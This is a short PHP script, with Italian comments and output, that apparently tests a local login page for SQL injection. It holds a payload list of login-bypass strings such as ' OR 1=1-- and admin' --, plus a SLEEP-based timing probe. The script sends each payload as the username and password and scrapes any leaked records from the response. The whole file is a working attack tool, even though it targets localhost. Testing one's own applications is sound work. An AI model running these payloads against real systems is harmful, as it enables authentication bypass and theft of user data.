<?php
// sqli_test.php

$target = "http://localhost:8080/index.php"; // Modifica se necessario

$payloads = [
    "' OR '1'='1",
    "' OR 1=1-- ",
    "' OR 'a'='a",
    "' OR 1=1#",
    "' OR ''='",
    "' OR 1=1/*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR EXISTS(SELECT * FROM users)--",
    "' OR SLEEP(5)--",
];

foreach ($payloads as $payload) {
    $username = urlencode($payload);
    $password = urlencode($payload);

    $url = "{$target}?username={$username}&password={$password}";

    echo "Testando payload: {$payload}\n";
    $response = @file_get_contents($url);

    if ($response === false) {
        echo "Errore nella richiesta HTTP\n";
        echo "-----------------------------\n";
        continue;
    }

    if (strpos($response, "ID:") !== false) {
        echo ">>> VULNERABILITÀ TROVATA con payload: {$payload}\n";
        // Estrai e mostra la parte dei dati trovati
        preg_match_all('/<div class="error" class="result-item">(.*?)<\/div>/s', $response, $matches);
        if (!empty($matches[1])) {
            foreach ($matches[1] as $result) {
                echo "Dati trovati:\n";
                echo trim(strip_tags($result)) . "\n";
            }
        } else {
            // In caso il pattern non funzioni, mostra tutta la risposta tra i tag <div class="error">
            preg_match_all('/<div class="error".*?>(.*?)<\/div>/s', $response, $matches2);
            foreach ($matches2[1] as $result) {
                if (strpos($result, "Credenziali non valide") === false) {
                    echo "Dati trovati:\n";
                    echo trim(strip_tags($result)) . "\n";
                }
            }
        }
    } elseif (strpos($response, "Credenziali non valide") !== false) {
        echo "Credenziali non valide (nessuna vulnerabilità rilevata con questo payload)\n";
    } else {
        echo "Risposta inaspettata o errore\n";
    }
    echo "-----------------------------\n";
}
?>